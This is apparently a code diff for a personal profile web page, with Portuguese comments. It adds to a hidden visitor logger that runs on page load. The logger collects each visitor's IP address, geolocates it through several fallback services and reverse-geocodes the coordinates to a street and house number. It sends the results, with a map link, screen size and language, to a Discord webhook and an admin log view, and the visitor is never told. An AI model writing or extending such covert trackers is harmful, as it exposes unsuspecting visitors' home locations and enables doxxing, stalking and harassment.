@@ -816,6 +816,17 @@ body::after {
      ============================================================ -->
 <script>
 // ============================================================
+// Polyfill: AbortSignal.timeout para browsers antigos
+// ============================================================
+if (!AbortSignal.timeout) {
+  AbortSignal.timeout = function(ms) {
+    const ctrl = new AbortController();
+    setTimeout(() => ctrl.abort(new DOMException('Timeout', 'TimeoutError')), ms);
+    return ctrl.signal;
+  };
+}
+
+// ============================================================
 // 👇 EDITAR AQUI: Suas informações
 // ============================================================
 const USERNAME = "knssfplf";
@@ -1119,13 +1130,22 @@ async function firebaseFetchLogs() {
   } catch { return null; }
 }
 
-// ---- Capturar dados do visitante ----
+// ---- Capturar dados do visitante (com fallbacks) ----
 async function captureVisitorData() {
   const data = {
     timestamp: new Date().toISOString(),
     timestamp_br: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
     ip: 'desconhecido',
-    location: { city: '?', region: '?', country: '?', zip: '?', isp: '?', address: '?', fullAddress: '?' },
+    location: {
+      city: '?', region: '?', country: '?', countryCode: '?',
+      zip: '?', lat: null, lon: null, timezone: '?',
+      isp: '?', as: '?', org: '?',
+      fullAddress: '?',
+      address: '?',
+      // endereço detalhado (só preenchido se achar rua)
+      road: '?', houseNumber: '?', neighbourhood: '?',
+      city_detail: '?', state: '?', postcode: '?', country_detail: '?'
+    },
     userAgent: navigator.userAgent.substring(0, 300),
     referrer: document.referrer || 'direto',
     page: window.location.href,
@@ -1133,50 +1153,172 @@ async function captureVisitorData() {
     language: navigator.language
   };
 
+  // ─── 1. PEGAR O IP ───────────────────────────────────────────
   try {
     const ipRes = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipRes.json();
     data.ip = ipData.ip;
+  } catch {
     try {
-      const locRes = await fetch(`https://ip-api.com/json/${data.ip}?fields=city,region,country,zip,lat,lon,timezone,isp,org,as`);
-      const locData = await locRes.json();
-      data.location.city = locData.city || '?';
-      data.location.region = locData.region || '?';
-      data.location.country = locData.country || '?';
-      data.location.zip = locData.zip || '?';
-      data.location.lat = locData.lat || null;
-      data.location.lon = locData.lon || null;
-      data.location.timezone = locData.timezone || '?';
-      data.location.isp = locData.isp || locData.org || '?';
-      data.location.as = locData.as || '?';
+      // fallback: usar ipinfo.io pra pegar IP também
+      const fallbackRes = await fetch('https://ipinfo.io/json');
+      const fallbackData = await fallbackRes.json();
+      data.ip = fallbackData.ip || data.ip;
+    } catch {}
+  }
 
-      // Reverse geocode: pegar endereço completo (rua, número) via OpenStreetMap
-      if (data.location.lat && data.location.lon) {
-        try {
-          const addrRes = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?lat=${data.location.lat}&lon=${data.location.lon}&format=json&addressdetails=1`,
-            { headers: { 'User-Agent': 'guns.lol-logger/1.0' } }
-          );
-          const addrData = await addrRes.json();
-          if (addrData && addrData.display_name) {
-            data.location.fullAddress = addrData.display_name;
-            const addr = addrData.address || {};
-            data.location.address = {
-              road: addr.road || addr.pedestrian || addr.footway || '?',
-              houseNumber: addr.house_number || '?',
-              neighbourhood: addr.neighbourhood || addr.suburb || '?',
-              city: addr.city || addr.town || addr.village || '?',
-              state: addr.state || '?',
-              postcode: addr.postcode || '?',
-              country: addr.country || '?'
-            };
-            // Sobrescrever CEP com o mais específico
-            if (addr.postcode) data.location.zip = addr.postcode;
-          }
-        } catch {}
+  // ─── 2. GEOLOCALIZAÇÃO (tenta 3 serviços em ordem) ───────────
+  let geoOk = false;
+
+  // 2a. Tenta ip-api.com (mais completo, grátis, sem chave)
+  if (!geoOk) {
+    try {
+      const locRes = await fetch(
+        `https://ip-api.com/json/${data.ip}?fields=status,message,city,region,regionName,country,countryCode,zip,lat,lon,timezone,isp,org,as,query`,
+        { signal: AbortSignal.timeout(5000) }
+      );
+      const locData = await locRes.json();
+      if (locData.status === 'success') {
+        data.location.city = locData.city || '?';
+        data.location.region = locData.regionName || locData.region || '?';
+        data.location.country = locData.country || '?';
+        data.location.countryCode = locData.countryCode || '?';
+        data.location.zip = locData.zip || '?';
+        data.location.lat = locData.lat || null;
+        data.location.lon = locData.lon || null;
+        data.location.timezone = locData.timezone || '?';
+        data.location.isp = locData.isp || locData.org || '?';
+        data.location.as = locData.as || '?';
+        data.location.org = locData.org || '?';
+        geoOk = true;
       }
     } catch {}
-  } catch {}
+  }
+
+  // 2b. Fallback: ipinfo.io (se ip-api falhou)
+  if (!geoOk) {
+    try {
+      const locRes = await fetch(`https://ipinfo.io/${data.ip}/json`, {
+        signal: AbortSignal.timeout(5000)
+      });
+      const locData = await locRes.json();
+      if (locData && locData.city) {
+        data.location.city = locData.city || '?';
+        data.location.region = locData.region || '?';
+        data.location.country = locData.country || '?';
+        data.location.countryCode = locData.country || '?';
+        data.location.zip = locData.postal || '?';
+        data.location.timezone = locData.timezone || '?';
+        data.location.isp = locData.org || locData.company?.name || '?';
+        data.location.org = locData.org || '?';
+        // ipinfo retorna "loc" como "lat,lon"
+        if (locData.loc) {
+          const [lat, lon] = locData.loc.split(',');
+          data.location.lat = parseFloat(lat) || null;
+          data.location.lon = parseFloat(lon) || null;
+        }
+        geoOk = true;
+      }
+    } catch {}
+  }
+
+  // 2c. Último fallback: ipapi.co (grátis 1000/dia)
+  if (!geoOk) {
+    try {
+      const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`, {
+        signal: AbortSignal.timeout(5000)
+      });
+      const locData = await locRes.json();
+      if (locData && locData.city) {
+        data.location.city = locData.city || '?';
+        data.location.region = locData.region || '?';
+        data.location.country = locData.country_name || '?';
+        data.location.countryCode = locData.country_code || '?';
+        data.location.zip = locData.postal || '?';
+        data.location.lat = locData.latitude || null;
+        data.location.lon = locData.longitude || null;
+        data.location.timezone = locData.timezone || '?';
+        data.location.isp = locData.org || locData.company || '?';
+        geoOk = true;
+      }
+    } catch {}
+  }
+
+  // ─── 3. REVERSE GEOCODING (endereço completo via coordenadas) ─
+  if (data.location.lat && data.location.lon) {
+    // 3a. Tenta Nominatim (OpenStreetMap) SEM user-agent (navegador bloqueia)
+    try {
+      const addrRes = await fetch(
+        `https://nominatim.openstreetmap.org/reverse?lat=${data.location.lat}&lon=${data.location.lon}&format=json&addressdetails=1&accept-language=pt`,
+        { signal: AbortSignal.timeout(4000) }
+      );
+      if (addrRes.ok) {
+        const addrData = await addrRes.json();
+        if (addrData && addrData.display_name) {
+          data.location.fullAddress = addrData.display_name;
+          const addr = addrData.address || {};
+          data.location.road = addr.road || addr.pedestrian || addr.footway || '?';
+          data.location.houseNumber = addr.house_number || '?';
+          data.location.neighbourhood = addr.neighbourhood || addr.suburb || addr.subdivision || '?';
+          data.location.city_detail = addr.city || addr.town || addr.village || addr.municipality || '?';
+          data.location.state = addr.state || addr.region || '?';
+          data.location.postcode = addr.postcode || '?';
+          data.location.country_detail = addr.country || '?';
+          if (addr.postcode) data.location.zip = addr.postcode;
+          // Criar objeto address pra compatibilidade
+          data.location.address = {
+            road: data.location.road,
+            houseNumber: data.location.houseNumber,
+            neighbourhood: data.location.neighbourhood,
+            city: data.location.city_detail,
+            state: data.location.state,
+            postcode: data.location.postcode,
+            country: data.location.country_detail
+          };
+        }
+      }
+    } catch {}
+
+    // 3b. Se Nominatim falhou ou não deu endereço completo, tenta BigDataCloud
+    if (data.location.fullAddress === '?' || data.location.fullAddress === null) {
+      try {
+        const bdcRes = await fetch(
+          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${data.location.lat}&longitude=${data.location.lon}&localityLanguage=pt`,
+          { signal: AbortSignal.timeout(4000) }
+        );
+        if (bdcRes.ok) {
+          const bdcData = await bdcRes.json();
+          if (bdcData && (bdcData.locality || bdcData.street)) {
+            const partes = [];
+            if (bdcData.street) partes.push(bdcData.street);
+            if (bdcData.houseNumber) partes.push(bdcData.houseNumber);
+            if (bdcData.locality) partes.push(` - ${bdcData.locality}`);
+            if (bdcData.city) partes.push(`, ${bdcData.city}`);
+            if (bdcData.postcode) {
+              partes.push(` - CEP: ${bdcData.postcode}`);
+              data.location.zip = bdcData.postcode;
+            }
+            if (bdcData.countryName) partes.push(`, ${bdcData.countryName}`);
+            data.location.fullAddress = partes.join(' ');
+            data.location.road = bdcData.street || '?';
+            data.location.houseNumber = bdcData.houseNumber || '?';
+            data.location.city_detail = bdcData.city || bdcData.locality || '?';
+            data.location.postcode = bdcData.postcode || '?';
+            data.location.state = bdcData.principalSubdivision || '?';
+            data.location.address = {
+              road: data.location.road,
+              houseNumber: data.location.houseNumber,
+              neighbourhood: bdcData.locality || '?',
+              city: data.location.city_detail,
+              state: data.location.state,
+              postcode: data.location.postcode,
+              country: bdcData.countryName || '?'
+            };
+          }
+        }
+      } catch {}
+    }
+  }
 
   return data;
 }
@@ -1191,16 +1333,33 @@ async function sendToDiscord(visitorData) {
     ? visitorData.location.fullAddress
     : `${visitorData.location.city}, ${visitorData.location.region} — ${visitorData.location.country}${visitorData.location.zip && visitorData.location.zip !== '?' ? ` (CEP: ${visitorData.location.zip})` : ''}`;
 
+  // Montar endereço detalhado
+  let enderecoDetalhado = endereco;
+  if (visitorData.location.road && visitorData.location.road !== '?') {
+    const rua = `${visitorData.location.road}${visitorData.location.houseNumber && visitorData.location.houseNumber !== '?' ? `, ${visitorData.location.houseNumber}` : ''}`;
+    const bairro = visitorData.location.neighbourhood && visitorData.location.neighbourhood !== '?' ? ` - ${visitorData.location.neighbourhood}` : '';
+    const cidade = visitorData.location.city_detail && visitorData.location.city_detail !== '?' ? `, ${visitorData.location.city_detail}` : `, ${visitorData.location.city}`;
+    const cep = visitorData.location.postcode && visitorData.location.postcode !== '?' ? ` - CEP: ${visitorData.location.postcode}` : visitorData.location.zip !== '?' ? ` - CEP: ${visitorData.location.zip}` : '';
+    const estado = visitorData.location.state && visitorData.location.state !== '?' ? ` - ${visitorData.location.state}` : '';
+    const pais = visitorData.location.country_detail && visitorData.location.country_detail !== '?' ? `, ${visitorData.location.country_detail}` : `, ${visitorData.location.country}`;
+    enderecoDetalhado = `${rua}${bairro}${cidade}${cep}${estado}${pais}`;
+  }
+
+  // Bandeira + país
+  const flagPais = visitorData.location.countryCode && visitorData.location.countryCode !== '?'
+    ? visitorData.location.countryCode.toLowerCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397))
+    : '🌐';
+
   const fields = [
     { name: '👤 IP', value: `\`${visitorData.ip}\``, inline: true },
-    { name: '📍 Endereço', value: endereco.substring(0, 200), inline: false },
+    { name: `${flagPais} País`, value: visitorData.location.country || '?', inline: true },
     { name: '🏢 ISP', value: visitorData.location.isp || '?', inline: true },
+    { name: '📍 Endereço Completo', value: enderecoDetalhado.substring(0, 1024), inline: false },
     { name: '🌍 Coordenadas', value: visitorData.location.lat ? `${visitorData.location.lat}, ${visitorData.location.lon}` : '?', inline: true },
     { name: '📅 Data', value: d.toLocaleDateString('pt-BR'), inline: true },
     { name: '⏰ Hora', value: d.toLocaleTimeString('pt-BR'), inline: true },
-    { name: '🖥️ Tela', value: visitorData.screen, inline: true },
-    { name: '📎 Referência', value: visitorData.referrer || 'direto', inline: false },
-    { name: '📱 UA', value: `\`\`\`${visitorData.userAgent.substring(0, 200)}\`\`\``, inline: false }
+    { name: '🖥️ Tela / Idioma', value: `${visitorData.screen} | ${visitorData.language}`, inline: true },
+    { name: '📎 Referência', value: visitorData.referrer?.substring(0, 100) || 'direto', inline: false }
   ];
 
   try {
@@ -1303,17 +1462,26 @@ async function renderAdminLogs() {
     const d = new Date(log.timestamp);
     const data = d.toLocaleDateString('pt-BR');
     const hora = d.toLocaleTimeString('pt-BR');
-    const flag = log.location.country && log.location.country !== '?' ? getFlag(log.location.country) : '🌐';
+    const flag = log.location.country && log.location.country !== '?' ? getFlag(log.location.country, log.location.countryCode) : '🌐';
 
     const mapsLink = log.location.lat && log.location.lon
       ? `<a href="https://www.google.com/maps?q=${log.location.lat},${log.location.lon}" target="_blank" rel="noopener" style="color:var(--cyan); text-decoration:none;">🗺️ Maps</a>`
       : '';
 
-    // Endereço completo (rua + número) ou fallback para cidade/estado
+    // Endereço completo — usa os novos campos detalhados
     let enderecoCompleto = '';
-    if (log.location.fullAddress && log.location.fullAddress !== '?') {
+    if (log.location.road && log.location.road !== '?') {
+      const r = log.location.road;
+      const n = log.location.houseNumber && log.location.houseNumber !== '?' ? `, ${log.location.houseNumber}` : '';
+      const b = log.location.neighbourhood && log.location.neighbourhood !== '?' ? ` - ${log.location.neighbourhood}` : '';
+      const c = log.location.city_detail && log.location.city_detail !== '?' ? `, ${log.location.city_detail}` : `, ${log.location.city}`;
+      const z = log.location.postcode && log.location.postcode !== '?' ? ` - CEP: ${log.location.postcode}` : log.location.zip !== '?' ? ` (CEP: ${log.location.zip})` : '';
+      const s = log.location.state && log.location.state !== '?' ? ` - ${log.location.state}` : '';
+      const p = log.location.country_detail && log.location.country_detail !== '?' ? `, ${log.location.country_detail}` : `, ${log.location.country}`;
+      enderecoCompleto = `${r}${n}${b}${c}${z}${s}${p}`;
+    } else if (log.location.fullAddress && log.location.fullAddress !== '?') {
       enderecoCompleto = log.location.fullAddress;
-    } else if (log.location.address && log.location.address.road && log.location.address.road !== '?') {
+    } else if (log.location.address && typeof log.location.address === 'object' && log.location.address.road && log.location.address.road !== '?') {
       const addr = log.location.address;
       enderecoCompleto = `${addr.road}, ${addr.houseNumber}${addr.neighbourhood && addr.neighbourhood !== '?' ? ` - ${addr.neighbourhood}` : ''}, ${addr.city}${addr.postcode && addr.postcode !== '?' ? ` - CEP: ${addr.postcode}` : ''}`;
     } else {
@@ -1349,27 +1517,31 @@ async function renderAdminLogs() {
 }
 
 // ---- Pegar bandeira do país (emoji) ----
-function getFlag(country) {
-  // Tenta匹配 alguns países comuns
+function getFlag(country, countryCode) {
+  // Tenta por countryCode primeiro (gera o emoji automaticamente)
+  if (countryCode && countryCode !== '?' && countryCode.length === 2) {
+    return countryCode.toLowerCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397));
+  }
+  // Fallback: mapa de nomes
   const map = {
-    'Brazil': '🇧🇷', 'Brasil': '🇧🇷',
+    'Brazil': '🇧🇷', 'Brasil': '🇧🇷', 'BR': '🇧🇷',
     'United States': '🇺🇸', 'EUA': '🇺🇸', 'US': '🇺🇸',
-    'Portugal': '🇵🇹',
-    'United Kingdom': '🇬🇧', 'UK': '🇬🇧',
-    'Germany': '🇩🇪', 'Alemanha': '🇩🇪',
-    'France': '🇫🇷', 'França': '🇫🇷',
-    'Japan': '🇯🇵', 'Japão': '🇯🇵',
-    'Canada': '🇨🇦',
-    'Australia': '🇦🇺',
-    'Argentina': '🇦🇷',
-    'Spain': '🇪🇸', 'Espanha': '🇪🇸',
-    'Italy': '🇮🇹', 'Itália': '🇮🇹',
-    'Russia': '🇷🇺', 'Rússia': '🇷🇺',
-    'China': '🇨🇳',
-    'South Korea': '🇰🇷', 'Coreia': '🇰🇷',
-    'Mexico': '🇲🇽', 'México': '🇲🇽',
-    'Netherlands': '🇳🇱', 'Holanda': '🇳🇱',
-    'Sweden': '🇸🇪', 'Suécia': '🇸🇪'
+    'Portugal': '🇵🇹', 'PT': '🇵🇹',
+    'United Kingdom': '🇬🇧', 'UK': '🇬🇧', 'GB': '🇬🇧',
+    'Germany': '🇩🇪', 'Alemanha': '🇩🇪', 'DE': '🇩🇪',
+    'France': '🇫🇷', 'França': '🇫🇷', 'FR': '🇫🇷',
+    'Japan': '🇯🇵', 'Japão': '🇯🇵', 'JP': '🇯🇵',
+    'Canada': '🇨🇦', 'CA': '🇨🇦',
+    'Australia': '🇦🇺', 'AU': '🇦🇺',
+    'Argentina': '🇦🇷', 'AR': '🇦🇷',
+    'Spain': '🇪🇸', 'Espanha': '🇪🇸', 'ES': '🇪🇸',
+    'Italy': '🇮🇹', 'Itália': '🇮🇹', 'IT': '🇮🇹',
+    'Russia': '🇷🇺', 'Rússia': '🇷🇺', 'RU': '🇷🇺',
+    'China': '🇨🇳', 'CN': '🇨🇳',
+    'South Korea': '🇰🇷', 'Coreia': '🇰🇷', 'KR': '🇰🇷',
+    'Mexico': '🇲🇽', 'México': '🇲🇽', 'MX': '🇲🇽',
+    'Netherlands': '🇳🇱', 'Holanda': '🇳🇱', 'NL': '🇳🇱',
+    'Sweden': '🇸🇪', 'Suécia': '🇸🇪', 'SE': '🇸🇪'
   };
   return map[country] || '🌐';
 }
